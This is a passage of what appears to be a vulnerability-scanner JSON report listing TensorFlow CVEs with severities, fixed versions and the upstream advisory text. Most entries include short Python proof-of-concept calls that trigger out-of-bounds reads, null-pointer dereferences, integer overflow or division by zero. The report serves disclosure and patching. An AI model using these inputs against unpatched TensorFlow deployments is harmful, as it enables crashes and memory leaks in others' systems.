                "markdown": "**Vulnerability CVE-2021-37651**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37651](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37651)|\n\n### Impact\nThe implementation for `tf.raw_ops.FractionalAvgPoolGrad` can be tricked into accessing data outside of bounds of heap allocated buffers:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.FractionalAvgPoolGrad(\n  orig_input_tensor_shape=[0,1,2,3],\n  out_backprop = np.array([[[[541],[541]],[[541],[541]]]]),\n  row_pooling_sequence=[0, 0, 0, 0, 0],\n  col_pooling_sequence=[-2, 0, 0, 2, 0],\n  overlapping=True)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/f24faa153ad31a4b51578f8181d3aaab77a1ddeb/tensorflow/core/kernels/fractional_avg_pool_op.cc#L205) does not validate that the input tensor is non-empty. Thus, code constructs an empty `EigenDoubleMatrixMap` and then accesses this buffer with indices that are outside of the empty area.\n\n### Patches\nWe have patched the issue in GitHub commit [0f931751fb20f565c4e94aa6df58d54a003cdb30](https://github.com/tensorflow/tensorflow/commit/0f931751fb20f565c4e94aa6df58d54a003cdb30).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37639",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37639"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37639",
              "help": {
                "text": "Vulnerability CVE-2021-37639\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37639](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37639)\n### Impact\nWhen restoring tensors via raw APIs, if the tensor name is not provided, TensorFlow can be tricked into dereferencing a null pointer:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.Restore(\n  file_pattern=[`/tmp`],\n  tensor_name=[], \n  default_value=21,\n  dt=tf.int,\n  preferred_shard=1)\n```\n  \nThe same undefined behavior can be triggered by `tf.raw_ops.RestoreSlice`:\n  \n```python\nimport tensorflow as tf\n\ntf.raw_ops.RestoreSlice(\n  file_pattern=[`/tmp`],\n  tensor_name=[], \n  shape_and_slice=`2`,\n  dt=inp.array([tf.int]),\n  preferred_shard=1)\n```\n\nAlternatively, attackers can read memory outside the bounds of heap allocated data by providing some tensor names but not enough for a successful restoration:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.Restore(\n  file_pattern=[`/tmp`],\n  tensor_name=[`x`], \n  default_value=21,\n  dt=tf.int,\n  preferred_shard=42)\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/47a06f40411a69c99f381495f490536972152ac0/tensorflow/core/kernels/save_restore_tensor.cc#L158-L159) retrieves the tensor list corresponding to the `tensor_name` user controlled input and immediately retrieves the tensor at the restoration index (controlled via `preferred_shard` argument). This occurs without validating that the provided list has enough values.\n\nIf the list is empty this results in dereferencing a null pointer (undefined behavior). If, however, the list has some elements, if the restoration index is outside the bounds this results in heap OOB read.\n\n### Patches \nWe have patched the issue in GitHub commit [9e82dce6e6bd1f36a57e08fa85af213e2b2f2622](https://github.com/tensorflow/tensorflow/commit/9e82dce6e6bd1f36a57e08fa85af213e2b2f2622).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37639**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37639](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37639)|\n\n### Impact\nWhen restoring tensors via raw APIs, if the tensor name is not provided, TensorFlow can be tricked into dereferencing a null pointer:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.Restore(\n  file_pattern=[`/tmp`],\n  tensor_name=[], \n  default_value=21,\n  dt=tf.int,\n  preferred_shard=1)\n```\n  \nThe same undefined behavior can be triggered by `tf.raw_ops.RestoreSlice`:\n  \n```python\nimport tensorflow as tf\n\ntf.raw_ops.RestoreSlice(\n  file_pattern=[`/tmp`],\n  tensor_name=[], \n  shape_and_slice=`2`,\n  dt=inp.array([tf.int]),\n  preferred_shard=1)\n```\n\nAlternatively, attackers can read memory outside the bounds of heap allocated data by providing some tensor names but not enough for a successful restoration:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.Restore(\n  file_pattern=[`/tmp`],\n  tensor_name=[`x`], \n  default_value=21,\n  dt=tf.int,\n  preferred_shard=42)\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/47a06f40411a69c99f381495f490536972152ac0/tensorflow/core/kernels/save_restore_tensor.cc#L158-L159) retrieves the tensor list corresponding to the `tensor_name` user controlled input and immediately retrieves the tensor at the restoration index (controlled via `preferred_shard` argument). This occurs without validating that the provided list has enough values.\n\nIf the list is empty this results in dereferencing a null pointer (undefined behavior). If, however, the list has some elements, if the restoration index is outside the bounds this results in heap OOB read.\n\n### Patches \nWe have patched the issue in GitHub commit [9e82dce6e6bd1f36a57e08fa85af213e2b2f2622](https://github.com/tensorflow/tensorflow/commit/9e82dce6e6bd1f36a57e08fa85af213e2b2f2622).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "8.4",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37685",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37685"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37685",
              "help": {
                "text": "Vulnerability CVE-2021-37685\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37685](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37685)\n### Impact\nTFLite`s [`expand_dims.cc`](https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50) contains a vulnerability which allows reading one element outside of bounds of heap allocated data:\n\n```cc\n  if (axis \u003c 0) { \n    axis = input_dims.size + 1 + axis;\n  }   \n  TF_LITE_ENSURE(context, axis \u003c= input_dims.size);\n\n  TfLiteIntArray* output_dims = TfLiteIntArrayCreate(input_dims.size + 1);\n  for (int i = 0; i \u003c output_dims-\u003esize; ++i) {\n    if (i \u003c axis) {\n      output_dims-\u003edata[i] = input_dims.data[i];\n    } else if (i == axis) {\n      output_dims-\u003edata[i] = 1;\n    } else {\n      output_dims-\u003edata[i] = input_dims.data[i - 1];\n    }\n  }\n```\n\nIf `axis` is a large negative value (e.g., `-100000`), then after the first `if` it would still be negative. The check following the `if` statement will pass and the `for` loop would read one element before the start of `input_dims.data` (when `i = 0`).\n\n### Patches\nWe have patched the issue in GitHub commit [d94ffe08a65400f898241c0374e9edc6fa8ed257](https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security.",
                "markdown": "**Vulnerability CVE-2021-37685**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37685](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37685)|\n\n### Impact\nTFLite`s [`expand_dims.cc`](https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50) contains a vulnerability which allows reading one element outside of bounds of heap allocated data:\n\n```cc\n  if (axis \u003c 0) { \n    axis = input_dims.size + 1 + axis;\n  }   \n  TF_LITE_ENSURE(context, axis \u003c= input_dims.size);\n\n  TfLiteIntArray* output_dims = TfLiteIntArrayCreate(input_dims.size + 1);\n  for (int i = 0; i \u003c output_dims-\u003esize; ++i) {\n    if (i \u003c axis) {\n      output_dims-\u003edata[i] = input_dims.data[i];\n    } else if (i == axis) {\n      output_dims-\u003edata[i] = 1;\n    } else {\n      output_dims-\u003edata[i] = input_dims.data[i - 1];\n    }\n  }\n```\n\nIf `axis` is a large negative value (e.g., `-100000`), then after the first `if` it would still be negative. The check following the `if` statement will pass and the `for` loop would read one element before the start of `input_dims.data` (when `i = 0`).\n\n### Patches\nWe have patched the issue in GitHub commit [d94ffe08a65400f898241c0374e9edc6fa8ed257](https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2020-15265",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-15265"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15265",
              "help": {
                "text": "Vulnerability CVE-2020-15265\nSeverity: high\nFixed Version: 2.4.0\nLink: [CVE-2020-15265](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15265)\n### Impact\nAn attacker can pass an invalid `axis` value to `tf.quantization.quantize_and_dequantize`:\n\n```python\ntf.quantization.quantize_and_dequantize(\n    input=[2.5, 2.5], input_min=[0,0], input_max=[1,1], axis=10)\n```\n\nThis results in accessing [a dimension outside the rank of the input tensor](https://github.com/tensorflow/tensorflow/blob/0225022b725993bfc19b87a02a2faaad9a53bc17/tensorflow/core/kernels/quantize_and_dequantize_op.cc#L74) in the C++ kernel implementation:\n```\nconst int depth = (axis_ == -1) ? 1 : input.dim_size(axis_);\n```\n\nHowever, [`dim_size` only does a `DCHECK`](https://github.com/tensorflow/tensorflow/blob/0225022b725993bfc19b87a02a2faaad9a53bc17/tensorflow/core/framework/tensor_shape.cc#L292-L307) to validate the argument and then uses it to access the corresponding element of an array:\n```\nint64 TensorShapeBase\u003cShape\u003e::dim_size(int d) const {\n  DCHECK_GE(d, 0);\n  DCHECK_LT(d, dims());\n  DoStuffWith(dims_[d]);\n}\n```\n\nSince in normal builds, `DCHECK`-like macros are no-ops, this results in segfault and access out of bounds of the array.\n\n### Patches\n\nWe have patched the issue in eccb7ec454e6617738554a255d77f08e60ee0808 and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported in #42105",
                "markdown": "**Vulnerability CVE-2020-15265**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.4.0|[CVE-2020-15265](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15265)|\n\n### Impact\nAn attacker can pass an invalid `axis` value to `tf.quantization.quantize_and_dequantize`:\n\n```python\ntf.quantization.quantize_and_dequantize(\n    input=[2.5, 2.5], input_min=[0,0], input_max=[1,1], axis=10)\n```\n\nThis results in accessing [a dimension outside the rank of the input tensor](https://github.com/tensorflow/tensorflow/blob/0225022b725993bfc19b87a02a2faaad9a53bc17/tensorflow/core/kernels/quantize_and_dequantize_op.cc#L74) in the C++ kernel implementation:\n```\nconst int depth = (axis_ == -1) ? 1 : input.dim_size(axis_);\n```\n\nHowever, [`dim_size` only does a `DCHECK`](https://github.com/tensorflow/tensorflow/blob/0225022b725993bfc19b87a02a2faaad9a53bc17/tensorflow/core/framework/tensor_shape.cc#L292-L307) to validate the argument and then uses it to access the corresponding element of an array:\n```\nint64 TensorShapeBase\u003cShape\u003e::dim_size(int d) const {\n  DCHECK_GE(d, 0);\n  DCHECK_LT(d, dims());\n  DoStuffWith(dims_[d]);\n}\n```\n\nSince in normal builds, `DCHECK`-like macros are no-ops, this results in segfault and access out of bounds of the array.\n\n### Patches\n\nWe have patched the issue in eccb7ec454e6617738554a255d77f08e60ee0808 and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported in #42105"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2020-15266",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-15266"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15266",
              "help": {
                "text": "Vulnerability CVE-2020-15266\nSeverity: medium\nFixed Version: 2.4.0\nLink: [CVE-2020-15266](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15266)\n### Impact\nWhen the `boxes` argument of `tf.image.crop_and_resize` has a very large value, the CPU kernel implementation receives it as a C++ `nan` floating point value. Attempting to operate on this is undefined behavior which later produces a segmentation fault.\n\n### Patches\n\nWe have patched the issue in c0319231333f0f16e1cc75ec83660b01fedd4182 and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported in #42129",
                "markdown": "**Vulnerability CVE-2020-15266**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.4.0|[CVE-2020-15266](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15266)|\n\n### Impact\nWhen the `boxes` argument of `tf.image.crop_and_resize` has a very large value, the CPU kernel implementation receives it as a C++ `nan` floating point value. Attempting to operate on this is undefined behavior which later produces a segmentation fault.\n\n### Patches\n\nWe have patched the issue in c0319231333f0f16e1cc75ec83660b01fedd4182 and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported in #42129"
              },
              "properties": {
                "security-severity": "3.7",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37645",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37645"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37645",
              "help": {
                "text": "Vulnerability CVE-2021-37645\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37645](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37645)\n### Impact\nThe implementation of `tf.raw_ops.QuantizeAndDequantizeV4Grad` is vulnerable to an integer overflow issue caused by converting a signed integer value to an unsigned one and then allocating memory based on this value.\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.QuantizeAndDequantizeV4Grad(\n  gradients=[1.0,2.0],\n  input=[1.0,1.0],\n  input_min=[0.0],\n  input_max=[10.0],\n  axis=-100)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/quantize_and_dequantize_op.cc#L126) uses the `axis` value as the size argument to `absl::InlinedVector` constructor. But, the constructor uses an unsigned type for the argument, so the implicit conversion transforms the negative value to a large integer.\n\n### Patches\nWe have patched the issue in GitHub commit [96f364a1ca3009f98980021c4b32be5fdcca33a1](https://github.com/tensorflow/tensorflow/commit/96f364a1ca3009f98980021c4b32be5fdcca33a1).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, and TensorFlow 2.4.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37645**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37645](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37645)|\n\n### Impact\nThe implementation of `tf.raw_ops.QuantizeAndDequantizeV4Grad` is vulnerable to an integer overflow issue caused by converting a signed integer value to an unsigned one and then allocating memory based on this value.\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.QuantizeAndDequantizeV4Grad(\n  gradients=[1.0,2.0],\n  input=[1.0,1.0],\n  input_min=[0.0],\n  input_max=[10.0],\n  axis=-100)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/quantize_and_dequantize_op.cc#L126) uses the `axis` value as the size argument to `absl::InlinedVector` constructor. But, the constructor uses an unsigned type for the argument, so the implicit conversion transforms the negative value to a large integer.\n\n### Patches\nWe have patched the issue in GitHub commit [96f364a1ca3009f98980021c4b32be5fdcca33a1](https://github.com/tensorflow/tensorflow/commit/96f364a1ca3009f98980021c4b32be5fdcca33a1).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, and TensorFlow 2.4.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-41216",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41216"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41216",
              "help": {
                "text": "Vulnerability CVE-2021-41216\nSeverity: medium\nFixed Version: 2.6.1\nLink: [CVE-2021-41216](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41216)\n### Impact\nThe [shape inference function for `Transpose`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/ops/array_ops.cc#L121-L185) is vulnerable to a heap buffer overflow:\n\n```python\nimport tensorflow as tf\n@tf.function\ndef test():\n  y = tf.raw_ops.Transpose(x=[1,2,3,4],perm=[-10])\n  return y\n\ntest()\n```\n\nThis occurs whenever `perm` contains negative elements. The shape inference function does not validate that the indices in `perm` are all valid:\n        \n```cc\nfor (int32_t i = 0; i \u003c rank; ++i) {\n  int64_t in_idx = data[i];\n  if (in_idx \u003e= rank) {\n    return errors::InvalidArgument(\"perm dim \", in_idx,\n                                   \" is out of range of input rank \", rank);\n  }\n  dims[i] = c-\u003eDim(input, in_idx);\n}\n```\n\nwhere `Dim(tensor, index)` accepts either a positive index less than the rank of the tensor or the special value `-1` for unknown dimensions.\n\n### Patches\nWe have patched the issue in GitHub commit [c79ba87153ee343401dbe9d1954d7f79e521eb14](https://github.com/tensorflow/tensorflow/commit/c79ba87153ee343401dbe9d1954d7f79e521eb14).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-41216**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.6.1|[CVE-2021-41216](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41216)|\n\n### Impact\nThe [shape inference function for `Transpose`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/ops/array_ops.cc#L121-L185) is vulnerable to a heap buffer overflow:\n\n```python\nimport tensorflow as tf\n@tf.function\ndef test():\n  y = tf.raw_ops.Transpose(x=[1,2,3,4],perm=[-10])\n  return y\n\ntest()\n```\n\nThis occurs whenever `perm` contains negative elements. The shape inference function does not validate that the indices in `perm` are all valid:\n        \n```cc\nfor (int32_t i = 0; i \u003c rank; ++i) {\n  int64_t in_idx = data[i];\n  if (in_idx \u003e= rank) {\n    return errors::InvalidArgument(\"perm dim \", in_idx,\n                                   \" is out of range of input rank \", rank);\n  }\n  dims[i] = c-\u003eDim(input, in_idx);\n}\n```\n\nwhere `Dim(tensor, index)` accepts either a positive index less than the rank of the tensor or the special value `-1` for unknown dimensions.\n\n### Patches\nWe have patched the issue in GitHub commit [c79ba87153ee343401dbe9d1954d7f79e521eb14](https://github.com/tensorflow/tensorflow/commit/c79ba87153ee343401dbe9d1954d7f79e521eb14).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-41218",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41218"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41218",
              "help": {
                "text": "Vulnerability CVE-2021-41218\nSeverity: medium\nFixed Version: 2.6.1\nLink: [CVE-2021-41218](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41218)\n### Impact\nThe [shape inference code for `AllToAll`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/ops/tpu_cross_replica_ops.cc#L25-L74) can be made to execute a division by 0:\n\n```python\nimport tensorflow as tf\n  \n@tf.function\ndef func():\n  return tf.raw_ops.AllToAll(\n    input=[0.0, 0.1652, 0.6543],\n    group_assignment=[1, -1],\n    concat_dimension=0,\n    split_dimension=0,\n    split_count=0)\n\nfunc()\n```\n\nThis occurs whenever the `split_count` argument is 0:\n  \n```cc\nTF_RETURN_IF_ERROR(c-\u003eGetAttr(\"split_count\", \u0026split_count));\n...                  \nfor (int32_t i = 0; i \u003c rank; ++i) {      \n  ...                                     \n  dims[i] = c-\u003eMakeDim(c-\u003eValue(dims[i]) / split_count);\n  ...                \n}\n```\n\n### Patches\nWe have patched the issue in GitHub commit [a8ad3e5e79c75f36edb81e0ba3f3c0c5442aeddc](https://github.com/tensorflow/tensorflow/commit/a8ad3e5e79c75f36edb81e0ba3f3c0c5442aeddc).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-41218**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.6.1|[CVE-2021-41218](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41218)|\n\n### Impact\nThe [shape inference code for `AllToAll`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/ops/tpu_cross_replica_ops.cc#L25-L74) can be made to execute a division by 0:\n\n```python\nimport tensorflow as tf\n  \n@tf.function\ndef func():\n  return tf.raw_ops.AllToAll(\n    input=[0.0, 0.1652, 0.6543],\n    group_assignment=[1, -1],\n    concat_dimension=0,\n    split_dimension=0,\n    split_count=0)\n\nfunc()\n```\n\nThis occurs whenever the `split_count` argument is 0:\n  \n```cc\nTF_RETURN_IF_ERROR(c-\u003eGetAttr(\"split_count\", \u0026split_count));\n...                  \nfor (int32_t i = 0; i \u003c rank; ++i) {      \n  ...                                     \n  dims[i] = c-\u003eMakeDim(c-\u003eValue(dims[i]) / split_count);\n  ...                \n}\n```\n\n### Patches\nWe have patched the issue in GitHub commit [a8ad3e5e79c75f36edb81e0ba3f3c0c5442aeddc](https://github.com/tensorflow/tensorflow/commit/a8ad3e5e79c75f36edb81e0ba3f3c0c5442aeddc).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-41205",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41205"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41205",
              "help": {
                "text": "Vulnerability CVE-2021-41205\nSeverity: medium\nFixed Version: 2.6.1\nLink: [CVE-2021-41205](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41205)\n### Impact\nThe [shape inference functions for the `QuantizeAndDequantizeV*` operations](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/ops/array_ops.cc) can trigger a read outside of bounds of heap allocated array as illustrated in the following sets of PoCs:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  data=tf.raw_ops.QuantizeAndDequantizeV4Grad(\n    gradients=[1.0,1.0],\n    input=[1.0,1.0],\n    input_min=[1.0,10.0],\n    input_max=[1.0,10.0],\n    axis=-100)\n  return data\n\ntest()\n```\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  data=tf.raw_ops.QuantizeAndDequantizeV4(\n    input=[1.0,1.0],\n    input_min=[1.0,10.0],\n    input_max=[1.0,10.0],\n    signed_input=False,\n    num_bits=10,\n    range_given=False,\n    round_mode=`HALF_TO_EVEN`,\n    narrow_range=False,\n    axis=-100)\n  return data\n\ntest()\n```\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  data=tf.raw_ops.QuantizeAndDequantizeV3(\n    input=[1.0,1.0],\n    input_min=[1.0,10.0],\n    input_max=[1.0,10.0],\n    signed_input=False,\n    num_bits=10,\n    range_given=False,\n    narrow_range=False,\n    axis=-100)\n  return data\n\ntest()\n```\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  data=tf.raw_ops.QuantizeAndDequantizeV2(\n    input=[1.0,1.0],\n    input_min=[1.0,10.0],\n    input_max=[1.0,10.0],\n    signed_input=False,\n    num_bits=10,\n    range_given=False,\n    round_mode=`HALF_TO_EVEN`,\n    narrow_range=False,\n    axis=-100)\n  return data\n\ntest()\n```\n\nIn all of these cases, `axis` is a negative value different than the special value used for optional/unknown dimensions (i.e., -1). However, the code ignores the occurences of these values:\n\n```cc\n...\nif (axis 